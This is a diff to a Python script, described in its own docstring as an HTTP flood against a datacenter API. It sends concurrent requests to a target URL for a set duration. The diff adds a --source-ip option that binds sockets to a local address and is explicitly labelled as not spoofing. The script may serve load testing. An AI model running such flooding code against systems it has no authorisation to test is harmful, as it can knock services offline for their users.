@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 """
 HTTP flood against the datacenter API.
+
+Optional --source-ip binds outbound sockets to a local interface address.
+This is not IP spoofing; TCP still requires a routable source for handshakes.
 """
 
 from __future__ import annotations
@@ -35,12 +38,23 @@ async def _worker(client: httpx.AsyncClient, url: str, deadline: float) -> tuple
     return ok, err
 
 
-def run_http_flood(base_url: str, path: str, concurrency: int, duration_s: float) -> None:
+def run_http_flood(
+    base_url: str,
+    path: str,
+    concurrency: int,
+    duration_s: float,
+    source_ip: str | None,
+) -> None:
     url = base_url.rstrip("/") + path
     deadline = time.monotonic() + duration_s
 
     async def _run() -> None:
-        async with httpx.AsyncClient(timeout=10.0) as client:
+        transport = (
+            httpx.AsyncHTTPTransport(local_address=source_ip)
+            if source_ip
+            else httpx.AsyncHTTPTransport()
+        )
+        async with httpx.AsyncClient(timeout=10.0, transport=transport) as client:
             results = await asyncio.gather(
                 *[_worker(client, url, deadline) for _ in range(concurrency)]
             )
@@ -80,13 +94,18 @@ def main() -> None:
         default=20.0,
         help="How long to run the flood, in seconds (default: 20)",
     )
+    p.add_argument(
+        "--source-ip",
+        default=None,
+        help="Optional local source IP to bind sockets (not spoofing).",
+    )
     args = p.parse_args()
 
     print(
-        "Starting HTTP flood.",
+        f"Starting HTTP flood (source_ip={args.source_ip or 'auto'}).",
         flush=True,
     )
-    run_http_flood(args.target, args.path, args.concurrency, args.duration)
+    run_http_flood(args.target, args.path, args.concurrency, args.duration, args.source_ip)
 
 
 if __name__ == "__main__":
